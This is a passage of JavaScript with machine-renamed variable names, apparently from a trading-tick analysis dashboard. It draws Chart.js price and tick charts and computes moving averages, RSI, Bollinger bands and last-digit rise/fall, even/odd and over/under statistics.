  const _0x519fad = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Tick_Change = new Chart(_0x4f8497, {
    type: "line",
    data: {
      labels: _0x519fad,
      datasets: [{
        label: "Tick Change",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Tick Change",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (_0x5c76c3) {
              if (_0x5c76c3.tick.value > 0) {
                return "#2e2e2e";
              } else if (_0x5c76c3.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Tick_Change();
const createChart20TickWorm = () => {
  const _0x181c4a = document.getElementById("chart20tickworm").getContext("2d");
  const _0x32a4be = ["20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChart20TickWorm = new Chart(_0x181c4a, {
    type: "line",
    data: {
      labels: _0x32a4be,
      datasets: [{
        fill: false,
        lineTension: 0,
        backgroundColor: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
        borderColor: "#fff",
        borderWidth: 1,
        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        pointStyle: [false],
        pointRadius: 10,
        pointHoverRadius: 15,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        },
        datalabels: {
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (_0x1b1256) {
              if (_0x1b1256.tick.value > 0) {
                return "#2e2e2e";
              } else if (_0x1b1256.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChart20TickWorm();
const createChartTickTrisma = () => {
  const _0x863a78 = document.getElementById("chartticktrisma").getContext("2d");
  const _0x3b0b52 = ["101st", "100th", "99th", "98th", "97th", "96th", "95th", "94th", "93th", "92th", "91th", "90th", "89th", "88th", "87th", "86th", "85th", "84th", "83th", "82th", "81th", "80th", "79th", "78th", "77th", "76th", "75th", "74th", "73th", "72th", "71th", "70th", "69th", "68th", "67th", "66th", "65th", "64th", "63th", "62th", "61th", "60th", "59th", "58th", "57th", "56th", "55th", "54th", "53th", "52th", "51th", "50th", "49th", "48th", "47th", "46th", "45th", "44th", "43th", "42th", "41th", "40th", "39th", "38th", "37th", "36th", "35th", "34th", "33th", "32th", "31th", "30th", "29th", "28th", "27th", "26th", "25th", "24th", "23rd", "22nd", "21st", "20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartTickTrisma = new Chart(_0x863a78, {
    type: "line",
    data: {
      labels: _0x3b0b52,
      datasets: [{
        label: "Price",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8
      }, {
        label: "SMA#1",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#f00",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }, {
        label: "SMA#2",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#0f0",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }, {
        label: "SMA#3",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#00f",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: false,
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (_0x571fda) {
              if (_0x571fda.tick.value > 0) {
                return "#2e2e2e";
              } else if (_0x571fda.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartTickTrisma();
function addDataChartLast10Dig_Digit(_0x50487f, _0x937665, _0x337a56) {
  const _0x31f894 = _0x50487f.data;
  if (_0x31f894.datasets.length > 0) {
    for (let _0x4a04b5 = 0; _0x4a04b5 < _0x31f894.datasets.length; ++_0x4a04b5) {
      _0x31f894.datasets[_0x4a04b5].data = _0x937665;
      _0x31f894.datasets[_0x4a04b5].backgroundColor = _0x337a56;
    }
    _0x50487f.options.plugins.datalabels.color = _0x337a56;
    _0x50487f.update("none");
  }
}
function addDataChartLast10Dig_Change(_0x4f18e7, _0x9959ba, _0x4d710d) {
  const _0x6c0a3 = _0x4f18e7.data;
  if (_0x6c0a3.datasets.length > 0) {
    for (let _0xf51ccf = 0; _0xf51ccf < _0x6c0a3.datasets.length; ++_0xf51ccf) {
      _0x6c0a3.datasets[_0xf51ccf].data = _0x9959ba;
      _0x6c0a3.datasets[_0xf51ccf].backgroundColor = _0x4d710d;
    }
    _0x4f18e7.options.plugins.datalabels.color = _0x4d710d;
    _0x4f18e7.update("none");
  }
}
function addDataChart20Cater(_0x1980c2, _0x4b04d9, _0x2b787e) {
  const _0x466830 = _0x1980c2.data;
  if (_0x466830.datasets.length > 0) {
    for (let _0x43f677 = 0; _0x43f677 < _0x466830.datasets.length; ++_0x43f677) {
      _0x466830.datasets[_0x43f677].data = _0x4b04d9;
      _0x466830.datasets[_0x43f677].backgroundColor = _0x2b787e;
    }
    _0x1980c2.options.plugins.datalabels.color = _0x2b787e;
    _0x1980c2.update("none");
  }
}
function addDataChartLast10Tick_Tick(_0x4a636a, _0x12af6f, _0x377d93) {
  const _0x13d0b8 = _0x4a636a.data;
  if (_0x13d0b8.datasets.length > 0) {
    for (let _0x3caa74 = 0; _0x3caa74 < _0x13d0b8.datasets.length; ++_0x3caa74) {
      _0x13d0b8.datasets[_0x3caa74].data = _0x12af6f;
      _0x13d0b8.datasets[_0x3caa74].backgroundColor = _0x377d93;
    }
    _0x4a636a.options.plugins.datalabels.color = _0x377d93;
    _0x4a636a.update("none");
  }
}
function addDataChartLast10Tick_Change(_0xc9c820, _0x1b7384, _0x542d6f) {
  const _0x26a176 = _0xc9c820.data;
  if (_0x26a176.datasets.length > 0) {
    for (let _0x301e33 = 0; _0x301e33 < _0x26a176.datasets.length; ++_0x301e33) {
      _0x26a176.datasets[_0x301e33].data = _0x1b7384;
      _0x26a176.datasets[_0x301e33].backgroundColor = _0x542d6f;
    }
    _0xc9c820.options.plugins.datalabels.color = _0x542d6f;
    _0xc9c820.update("none");
  }
}
function addDataChart20TickWorm(_0x1beaad, _0x4f34d0, _0x48e5b4, _0x2a5628) {
  const _0xf1de22 = _0x1beaad.data;
  if (_0xf1de22.datasets.length > 0) {
    for (let _0x2125f0 = 0; _0x2125f0 < _0xf1de22.datasets.length; ++_0x2125f0) {
      _0xf1de22.datasets[_0x2125f0].data = _0x4f34d0;
      _0xf1de22.datasets[_0x2125f0].backgroundColor = _0x48e5b4;
      _0xf1de22.datasets[_0x2125f0].pointStyle = _0x2a5628;
    }
    _0x1beaad.options.plugins.datalabels.color = _0x48e5b4;
    _0x1beaad.update("none");
  }
}
function addDataChartticktrisma(_0x8e47ae, _0x3cc681) {
  const _0x38ae30 = _0x8e47ae.data;
  if (_0x38ae30.datasets.length > 0) {
    for (let _0x4070b7 = 0; _0x4070b7 < _0x38ae30.datasets.length; ++_0x4070b7) {
      _0x38ae30.datasets[_0x4070b7].data = _0x3cc681[_0x4070b7];
    }
    _0x8e47ae.update("none");
  }
}
function calculateMovingAverage(_0x3a273e, _0x158664) {
  var _0x26c7f4 = [];
  if (_0x3a273e.length < _0x158664) {
    return _0x26c7f4;
  }
  var _0xa3da3a = 0;
  for (var _0x105262 = 0; _0x105262 < _0x158664; ++_0x105262) {
    _0xa3da3a += _0x3a273e[_0x105262];
  }
  _0x26c7f4.push(_0xa3da3a / _0x158664);
  var _0x27351b = _0x3a273e.length - _0x158664 - 1;
  for (var _0x105262 = 0; _0x105262 < _0x27351b; ++_0x105262) {
    _0xa3da3a = _0xa3da3a - _0x3a273e[_0x105262];
    _0xa3da3a = _0xa3da3a + _0x3a273e[_0x105262 + _0x158664];
    _0x26c7f4.push(_0xa3da3a / _0x158664);
  }
  return _0x26c7f4;
}
function calculateRSI(_0x547518, _0x5d2d33) {
  let _0x414faa = 0;
  for (let _0x26b2a1 = 1; _0x26b2a1 < _0x5d2d33; _0x26b2a1++) {
    _0x414faa += Math.max(0, _0x547518[_0x26b2a1] - _0x547518[_0x26b2a1 - 1]);
  }
  _0x414faa /= _0x5d2d33;
  let _0x5eee84 = 0;
  for (let _0x293c6a = 1; _0x293c6a < _0x5d2d33; _0x293c6a++) {
    _0x5eee84 += Math.max(0, _0x547518[_0x293c6a - 1] - _0x547518[_0x293c6a]);
  }
  _0x5eee84 /= _0x5d2d33;
  const _0x5c20e8 = 100 - 100 / (1 + _0x414faa / _0x5eee84);
  return _0x5c20e8;
}
function calculateBollingerBands(_0x3c5e9b, _0x316fb6, _0x5bf8f8) {
  _0x3c5e9b = _0x3c5e9b.slice(-_0x316fb6);
  let _0x392c84 = 0;
  for (let _0x154416 = 0; _0x154416 < _0x316fb6; _0x154416++) {
    _0x392c84 += _0x3c5e9b[_0x154416];
  }
  const _0x1d8251 = _0x392c84 / _0x316fb6;
  _0x392c84 = 0;
  for (let _0x202f1a = 0; _0x202f1a < _0x316fb6; _0x202f1a++) {
    _0x392c84 += Math.pow(_0x3c5e9b[_0x202f1a] - _0x1d8251, 2);
  }
  const _0x5c2bbd = Math.sqrt(_0x392c84 / _0x316fb6);
  const _0x5d8218 = _0x1d8251 + _0x5c2bbd * _0x5bf8f8;
  const _0x4557ae = _0x1d8251 - _0x5c2bbd * _0x5bf8f8;
  return [_0x5d8218, _0x1d8251, _0x4557ae];
}
let thelast10digits_digit_list;
let thelast10digits_tickmove_list;
let thelast10digits_change_list;
let thelast10digits_digitmove_list;
let thelast10digits_digitgraph_list;
let digitstatistic_list;
let thelast20digits_digitcater_list;
let thelast20digits_digitevenodd_list;
let thelast10ticks_tick_list;
let thelast10ticks_move_list;
let thelast10ticks_worm_list;
let thelast10ticks_sentiment_list;
let thelast10ticks_change_list;
let thelast10ticks_changeperc_list;
let thelast20tickworm_history_list;
let thelast20tickworm_current_list;
let tick_sma_list;
const showUpAllAboutTick = (_0x15a26b, _0x4f28a8, _0x9a9ef4, _0x4e96da) => {
  let _0x4881c3;
  let _0x314b59 = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("digitstatistic") != -1;
  if (_0x314b59 && selData.value == "digitstatistic") {
    document.getElementById("div_digitstatistic").style.display = "block";
  } else {
    document.getElementById("div_digitstatistic").style.display = "none";
  }
  if (_0x314b59) {
    let _0x5b9c8d = [];
    let _0x4dfac0;
    let _0x55765a;
    let _0x13f77c;
    let _0x36c497;
    let _0x20179d;
    let _0x4525ec;
    let _0x22a80a;
    let _0x5c993f;
    let _0x432d67;
    digitstatistic_list = [];
    for (k = 1; k <= 6; k++) {
      _0x4881c3 = _0x4f28a8.slice(digitstatistic_noofticks[k].value * -1);
      _0x5b9c8d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      _0x36c497 = [];
      _0x20179d = [];
      digitstatistic_list[k] = [];
      for (const _0x1e6d69 of _0x4881c3) {
        _0x5b9c8d[_0x1e6d69] = _0x5b9c8d[_0x1e6d69] ? _0x5b9c8d[_0x1e6d69] + 1 : 1;
      }
      _0x55765a = Math.max(..._0x5b9c8d);
      _0x13f77c = Math.min(..._0x5b9c8d);
      for (i = 0; i <= 9; i++) {
        if (_0x5b9c8d[i] == _0x55765a) {
          _0x36c497.push(i);
          document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor = colorRise;
        } else if (_0x5b9c8d[i] == _0x13f77c) {
          _0x20179d.push(i);
          document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor = colorFall;
        } else {
          document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor = colorNo;
        }
        _0x4dfac0 = (_0x5b9c8d[i] / _0x4881c3.length * 100).toFixed(2);
        document.getElementById("digitstatistic_" + k + "_" + i).innerText = _0x4dfac0;
        digitstatistic_list[k][i] = _0x4dfac0 * 1;
      }
      document.getElementById("digitstatistic_" + k + "_least").innerText = _0x20179d;
      document.getElementById("digitstatistic_" + k + "_most").innerText = _0x36c497;
    }
    _0x432d67 = [];
    _0x5c993f = [];
    digitstatistic_list[7] = [];
    for (i = 0; i <= 9; i++) {
      _0x4525ec = true;
      _0x22a80a = true;
      for (k = 1; k <= 6; k++) {
        var _0x2b72cc = rgbToHex(document.getElementById("digitstatistic_" + k + "_" + i).style.backgroundColor);
        if (_0x2b72cc != colorFall) {
          _0x4525ec = false;
        }
        if (_0x2b72cc != colorRise) {
          _0x22a80a = false;
        }
      }
      if (_0x4525ec) {
        document.getElementById("digitstatistic_summ_" + i).innerText = i;
        document.getElementById("digitstatistic_summ_" + i).style.backgroundColor = colorFall;
        _0x432d67.push(i);
        digitstatistic_list[7][i] = i * 1;
      } else if (_0x22a80a) {
        document.getElementById("digitstatistic_summ_" + i).innerText = i;
        document.getElementById("digitstatistic_summ_" + i).style.backgroundColor = colorRise;
        _0x5c993f.push(i);
        digitstatistic_list[7][i] = i * 1;
      } else {
        document.getElementById("digitstatistic_summ_" + i).innerText = "";
        document.getElementById("digitstatistic_summ_" + i).style.backgroundColor = "";
        digitstatistic_list[7][i] = "";
      }
    }
    document.getElementById("digitstatistic_summ_least").innerText = _0x432d67;
    document.getElementById("digitstatistic_summ_most").innerText = _0x5c993f;
  }
  let _0x226726;
  let _0x5e3e6c;
  let _0x2e02b8;
  let _0xacdd96;
  let _0x5ea549;
  let _0x278fbe;
  let _0x52d1fa = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast10digits") != -1;
  if (_0x52d1fa && selData.value == "thelast10digits") {
    document.getElementById("div_thelast10digits").style.display = "block";
  } else {
    document.getElementById("div_thelast10digits").style.display = "none";
  }
  if (_0x52d1fa) {
    _0x226726 = _0x15a26b.slice(-11);
    _0x5e3e6c = _0x4f28a8.slice(-11);
    thelast10digits_digit_list = [];
    thelast10digits_tickmove_list = [];
    thelast10digits_change_list = [];
    thelast10digits_digitmove_list = [];
    thelast10digits_digitgraph_list = [];
    _0x5ea549 = [];
    for (i = 1; i < _0x5e3e6c.length; i++) {
      _0x2e02b8 = _0x5e3e6c.length - i;
      document.getElementById("thelast10digits_digit_" + _0x2e02b8).innerText = _0x5e3e6c[i];
      _0xacdd96 = _0x5e3e6c[i] - _0x5e3e6c[i - 1];
      document.getElementById("thelast10digits_change_" + _0x2e02b8).innerText = (_0xacdd96 > 0 ? "+" : _0xacdd96 < 0 ? "-" : "") + Math.abs(_0xacdd96);
      document.getElementById("thelast10digits_digitmove_" + _0x2e02b8).innerText = _0xacdd96 > 0 ? "Rise" : _0xacdd96 < 0 ? "Fall" : "No";
      thelast10digits_digitmove_list.push(document.getElementById("thelast10digits_digitmove_" + _0x2e02b8).innerText);
      document.getElementById("thelast10digits_change_" + _0x2e02b8).style.backgroundColor = document.getElementById("thelast10digits_digitmove_" + _0x2e02b8).style.backgroundColor = _0xacdd96 > 0 ? colorRise : _0xacdd96 < 0 ? colorFall : colorNo;
      _0xacdd96 = _0x226726[i] - _0x226726[i - 1];
      document.getElementById("thelast10digits_tickmove_" + _0x2e02b8).innerText = _0xacdd96 > 0 ? "Rise" : _0xacdd96 < 0 ? "Fall" : "No";
      thelast10digits_tickmove_list.push(document.getElementById("thelast10digits_tickmove_" + _0x2e02b8).innerText);
      document.getElementById("thelast10digits_digitgraph_" + _0x2e02b8).innerText = (_0xacdd96 > 0 ? "+" : _0xacdd96 < 0 ? "-" : "") + _0x5e3e6c[i];
      document.getElementById("thelast10digits_digit_" + _0x2e02b8).style.backgroundColor = document.getElementById("thelast10digits_tickmove_" + _0x2e02b8).style.backgroundColor = document.getElementById("thelast10digits_digitgraph_" + _0x2e02b8).style.backgroundColor = _0xacdd96 > 0 ? colorRise : _0xacdd96 < 0 ? colorFall : colorNo;
      thelast10digits_digitgraph_list.push(document.getElementById("thelast10digits_digitgraph_" + _0x2e02b8).innerText * 1);
      thelast10digits_digit_list.push(document.getElementById("thelast10digits_digit_" + _0x2e02b8).innerText * 1);
      thelast10digits_change_list.push(document.getElementById("thelast10digits_change_" + _0x2e02b8).innerText * 1);
      _0x5ea549.push(document.getElementById("thelast10digits_change_" + _0x2e02b8).style.backgroundColor);
    }
    addDataChartLast10Dig_Digit(mainChartLast10Dig_Digit, thelast10digits_digit_list, _0x5ea549);
    addDataChartLast10Dig_Change(mainChartLast10Dig_Change, thelast10digits_change_list, _0x5ea549);
  }
  let _0x27959a = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast20digits_digitcater") != -1;
  if (_0x27959a && selData.value == "thelast20digitscaterzian") {
    document.getElementById("div_thelast20digitscaterzian").style.display = "block";
  } else {
    document.getElementById("div_thelast20digitscaterzian").style.display = "none";
  }
  if (_0x27959a) {
    _0x226726 = _0x15a26b.slice(-21);
    _0x5e3e6c = _0x4f28a8.slice(-21);
    thelast20digits_digitcater_list = [];
    _0x278fbe = [];
    for (i = 1; i < _0x5e3e6c.length; i++) {
      _0x2e02b8 = _0x5e3e6c.length - i;
      _0xacdd96 = _0x226726[i] - _0x226726[i - 1];
      document.getElementById("thelast20digits_digitcater_" + _0x2e02b8).innerText = (_0xacdd96 > 0 ? "+" : _0xacdd96 < 0 ? "-" : "") + _0x5e3e6c[i];
      document.getElementById("thelast20digits_digitcater_" + _0x2e02b8).style.backgroundColor = _0xacdd96 > 0 ? colorRise : _0xacdd96 < 0 ? colorFall : colorNo;
      thelast20digits_digitcater_list.push(document.getElementById("thelast20digits_digitcater_" + _0x2e02b8).innerText * 1);
      _0x278fbe.push(document.getElementById("thelast20digits_digitcater_" + _0x2e02b8).style.backgroundColor);
    }
    addDataChart20Cater(mainChart20Cater, thelast20digits_digitcater_list, _0x278fbe);
  }
  let _0x398231 = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast20digits_digitevenodd") != -1;
  if (_0x398231 && selData.value == "thelast20digitsevenodd") {
    document.getElementById("div_thelast20digitsevenodd").style.display = "block";
  } else {
    document.getElementById("div_thelast20digitsevenodd").style.display = "none";
  }
  if (_0x398231) {
    _0x226726 = _0x15a26b.slice(-21);
    _0x5e3e6c = _0x4f28a8.slice(-21);
    thelast20digits_digitevenodd_list = [];
    for (i = 1; i < _0x5e3e6c.length; i++) {
      _0x2e02b8 = _0x5e3e6c.length - i;
      _0xacdd96 = _0x226726[i] - _0x226726[i - 1];
      document.getElementById("thelast20digits_digitevenodd_" + _0x2e02b8).innerText = _0x5e3e6c[i] % 2 == 0 ? "Even" : "Odd";
      document.getElementById("thelast20digits_digitevenodd_" + _0x2e02b8).style.backgroundColor = _0xacdd96 > 0 ? colorRise : _0xacdd96 < 0 ? colorFall : colorNo;
      thelast20digits_digitevenodd_list.push(document.getElementById("thelast20digits_digitevenodd_" + _0x2e02b8).innerText);
    }
  }
  let _0x36d099 = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("risevsfall") != -1;
  if (_0x36d099 && selData.value == "risevsfall") {
    document.getElementById("div_risevsfall").style.display = "block";
  } else {
    document.getElementById("div_risevsfall").style.display = "none";
  }
  if (_0x36d099) {
    let _0xb694bf;
    let _0x26f8f6;
    let _0xb034d9;
    let _0x861298;
    for (k = 1; k <= 6; k++) {
      let _0x2b99a7 = risevsfall_noofticks[k].value * 1;
      _0x4881c3 = _0x15a26b.slice(-_0x2b99a7);
      _0xb694bf = _0x26f8f6 = 0;
      for (i = 1; i < _0x4881c3.length; i++) {
        if (_0x4881c3[i - 1] < _0x4881c3[i]) {
          _0xb694bf++;
        }
      }
      _0x26f8f6 = _0x2b99a7 - _0xb694bf;
      _0xb034d9 = _0xb694bf / _0x2b99a7 * 100;
      _0x861298 = _0x26f8f6 / _0x2b99a7 * 100;
      document.getElementById("risevsfall_" + k + "_rise").innerText = document.getElementById("risevsfall_" + k + "_rise").style.width = _0xb034d9.toFixed(2) + "%";
      document.getElementById("risevsfall_" + k + "_fall").innerText = document.getElementById("risevsfall_" + k + "_fall").style.width = _0x861298.toFixed(2) + "%";
    }
  }
  let _0x1ede9d = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("evenvsodd") != -1;
  if (_0x1ede9d && selData.value == "evenvsodd") {
    document.getElementById("div_evenvsodd").style.display = "block";
  } else {
    document.getElementById("div_evenvsodd").style.display = "none";
  }
  if (_0x1ede9d) {
    let _0x11da4e;
    let _0x38f6ac;
    let _0x961b23;
    let _0x3a4fc6;
    for (k = 1; k <= 6; k++) {
      let _0x449349 = evenvsodd_noofticks[k].value * 1;
      _0x4881c3 = _0x4f28a8.slice(-_0x449349);
      _0x11da4e = _0x38f6ac = 0;
      for (i = 0; i < _0x4881c3.length; i++) {
        if (_0x4881c3[i] % 2 == 0) {
          _0x11da4e++;
        }
      }
      _0x38f6ac = _0x449349 - _0x11da4e;
      _0x961b23 = _0x11da4e / _0x449349 * 100;
      _0x3a4fc6 = _0x38f6ac / _0x449349 * 100;
      document.getElementById("evenvsodd_" + k + "_even").innerText = document.getElementById("evenvsodd_" + k + "_even").style.width = _0x961b23.toFixed(2) + "%";
      document.getElementById("evenvsodd_" + k + "_odd").innerText = document.getElementById("evenvsodd_" + k + "_odd").style.width = _0x3a4fc6.toFixed(2) + "%";
    }
  }
  let _0x3dc71a = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("overvsunder") != -1;
  if (_0x3dc71a && selData.value == "overvsunder") {
    document.getElementById("div_overvsunder").style.display = "block";
  } else {
    document.getElementById("div_overvsunder").style.display = "none";
  }
  if (_0x3dc71a) {
    let _0xc52b52;
    let _0x188f4f;
    let _0x28a8b9;
    let _0x299dc9;
    for (k = 1; k <= 2; k++) {
      let _0x2a5855 = overvsunder_noofticks[k].value * 1;
      _0x4881c3 = _0x4f28a8.slice(-_0x2a5855);
      _0xc52b52 = _0x188f4f = 0;
      for (i = 0; i < _0x4881c3.length; i++) {
        if (_0x4881c3[i] > document.getElementById("overvsunder_" + k + "_overdigit").value * 1) {
          _0xc52b52++;
        }
        if (_0x4881c3[i] < document.getElementById("overvsunder_" + k + "_underdigit").value * 1) {
          _0x188f4f++;
        }
      }
      _0x28a8b9 = _0xc52b52 / _0x2a5855 * 100;
      _0x299dc9 = _0x188f4f / _0x2a5855 * 100;
      document.getElementById("overvsunder_" + k + "_over").innerText = _0x28a8b9.toFixed(2) + "%";
      document.getElementById("overvsunder_" + k + "_over").style.width = (_0x28a8b9 / Math.max(_0x28a8b9, _0x299dc9) * 100).toFixed(2) + "%";
      document.getElementById("overvsunder_" + k + "_under").innerText = _0x299dc9.toFixed(2) + "%";
      document.getElementById("overvsunder_" + k + "_under").style.width = (_0x299dc9 / Math.max(_0x28a8b9, _0x299dc9) * 100).toFixed(2) + "%";
    }
  }
  let _0x3f0ad1;
  let _0xd64e00 = btn_run.src.split("/").pop() === "icon_run.png" || btn_run.src.split("/").pop() === "icon_stop.png" && mainWorkspaceCode.indexOf("thelast10ticks") != -1;
  if (_0xd64e00 && selData.value == "thelast10ticks") {
    document.getElementById("div_thelast10ticks").style.display = "block";
  } else {
    document.getElementById("div_thelast10ticks").style.display = "none";
  }
  if (_0xd64e00) {
    let _0x3d71c9;
    let _0x62a66a;
    let _0x1bcbf0;
    _0x226726 = _0x15a26b.slice(-39);
    thelast10ticks_tick_list = [];
    _0x62a66a = [];
    thelast10ticks_move_list = [];
    thelast10ticks_worm_list = [];
    thelast10ticks_change_list = [];
    thelast10ticks_sentiment_list = [];
    _0x1bcbf0 = [];
    thelast10ticks_changeperc_list = [];
    for (i = 29; i < _0x226726.length; i++) {
      _0x2e02b8 = _0x226726.length - i;
      document.getElementById("thelast10ticks_tick_" + _0x2e02b8).innerText = _0x226726[i].toFixed(_0x9a9ef4);
      document.getElementById("thelast10ticks_move_" + _0x2e02b8).innerText = _0x226726[i - 1] < _0x226726[i] ? "Rise" : _0x226726[i - 1] > _0x226726[i] ? "Fall" : "No";
      document.getElementById("thelast10ticks_tick_" + _0x2e02b8).style.backgroundColor = document.getElementById("thelast10ticks_move_" + _0x2e02b8).style.backgroundColor = _0x226726[i - 1] < _0x226726[i] ? colorRise : _0x226726[i - 1] > _0x226726[i] ? colorFall : colorNo;
      _0x3f0ad1 = _0x226726.slice(i - 19, i + 1);
      document.getElementById("thelast10ticks_worm_" + _0x2e02b8).innerText = _0x226726[i] == Math.max(..._0x3f0ad1) ? "Blue" : _0x226726[i] == Math.min(..._0x3f0ad1) ? "Red" : "Green";
      thelast10ticks_worm_list.push(document.getElementById("thelast10ticks_worm_" + _0x2e02b8).innerText);
      document.getElementById("thelast10ticks_worm_" + _0x2e02b8).style.backgroundColor = _0x226726[i] == Math.max(..._0x3f0ad1) ? colorRise : _0x226726[i] == Math.min(..._0x3f0ad1) ? colorFall : colorWormNo;
      document.getElementById("thelast10ticks_sentiment_" + _0x2e02b8).innerText = _0x226726[i - 3] < _0x226726[i - 2] && _0x226726[i - 2] < _0x226726[i - 1] && _0x226726[i - 1] < _0x226726[i] ? "Rise" : _0x226726[i - 3] > _0x226726[i - 2] && _0x226726[i - 2] > _0x226726[i - 1] && _0x226726[i - 1] > _0x226726[i] ? "Fall" : "No";
      thelast10ticks_sentiment_list.push(document.getElementById("thelast10ticks_sentiment_" + _0x2e02b8).innerText);
      document.getElementById("thelast10ticks_sentiment_" + _0x2e02b8).style.backgroundColor = _0x226726[i - 3] < _0x226726[i - 2] && _0x226726[i - 2] < _0x226726[i - 1] && _0x226726[i - 1] < _0x226726[i] ? colorRise : _0x226726[i - 3] > _0x226726[i - 2] && _0x226726[i - 2] > _0x226726[i - 1] && _0x226726[i - 1] > _0x226726[i] ? colorFall : colorNo;
      _0xacdd96 = _0x226726[i] - _0x226726[i - 1];
      _0x3d71c9 = _0xacdd96 / _0x226726[i - 1] * 100;
      document.getElementById("thelast10ticks_change_" + _0x2e02b8).innerText = (_0xacdd96 > 0 ? "+" : _0xacdd96 < 0 ? "-" : "") + Math.abs(_0xacdd96).toFixed(2);
      document.getElementById("thelast10ticks_%_" + _0x2e02b8).innerText = (_0xacdd96 > 0 ? "+" : _0xacdd96 < 0 ? "-" : "") + Math.abs(_0x3d71c9).toFixed(2);
      thelast10ticks_changeperc_list.push(document.getElementById("thelast10ticks_%_" + _0x2e02b8).innerText * 1);
